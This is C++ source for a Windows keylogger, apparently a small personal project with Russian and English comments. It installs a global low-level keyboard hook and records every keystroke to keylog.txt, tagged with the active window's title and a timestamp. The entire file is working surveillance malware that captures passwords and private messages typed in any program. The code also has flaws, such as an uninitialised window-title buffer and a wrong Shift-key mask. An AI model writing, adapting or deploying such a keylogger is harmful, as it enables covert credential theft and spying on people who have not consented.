//
// Created by jacquelp on 1/10/2024.
//

#include <Windows.h>
#include <winuser.h>
#include <ctime>
#include <iostream>
#include <fstream>

using namespace std;

int Save (int key); //записывать в файл и определять, какая кнопка была нажата

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
//получаем результат hook функции

HHOOK hook; // handle for hook

KBDLLHOOKSTRUCT kbrStruct; //what button is pressed and what's its code

ofstream file; //insert data into a file



int Save (int key) {
    if (key == 1 || key == 2) //1 -left mouse, 2 - right mouse
        return 0;

    //we have to write a descriptor for an outer program which we work in
    HWND foreground = GetForegroundWindow(); //hwnd - window handle
    DWORD threadID; //double word. 32 bit size is guaranteed! not like in int
    HKL keyBoardLayout; //contains keyboard layout

    char preProgram[256];
    char crrProgram[256];
    char crrkey;

    if(foreground) {
        threadID = GetWindowThreadProcessId(foreground, NULL);
          keyBoardLayout = GetKeyboardLayout(threadID); //tweak it for russian abc as well

//        keyBoardLayout = LoadKeyboardLayoutA();

        GetWindowText(foreground, crrProgram, sizeof(crrProgram));
        if(strcmp(crrProgram, preProgram) != 0) {
            strcpy_s(preProgram, sizeof(preProgram), crrProgram);
            time_t t = time(NULL);
            struct tm *tm = localtime(&t);
            char c[64];
            strftime(c,sizeof(c), "%c", tm);
            file<<"\n\n\nProgram: "<<crrProgram<<" DateTime: "<<c<<"\n";
        }

    }

//    cout<<key<<endl;

    bool CapsLock = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
    //if it's on, bool true
    if((GetKeyState(VK_SHIFT) & 0x1000) != 0 ||
       (GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
       (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
        CapsLock = !CapsLock;
    }
    crrkey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, keyBoardLayout);
    if (!CapsLock) crrkey = tolower(crrkey);
    file<<char(crrkey);

    file.flush();

    return 0;
}


LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if(wParam == WM_KEYDOWN) {
            kbrStruct = *((KBDLLHOOKSTRUCT*)lParam);
            Save(kbrStruct.vkCode);
        }
    }

    return CallNextHookEx(hook, nCode, wParam, lParam);
}



int main() {
    file.open("keylog.txt", ios_base::app);
    ShowWindow(FindWindowA("ConsoleWindowsClass", NULL), 1);

    if(!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
        MessageBox(NULL, "Error occurred", "Error", MB_ICONERROR);
    }

    MSG message;

    while (true) {
        GetMessage(&message, NULL, 0,0);
    }


}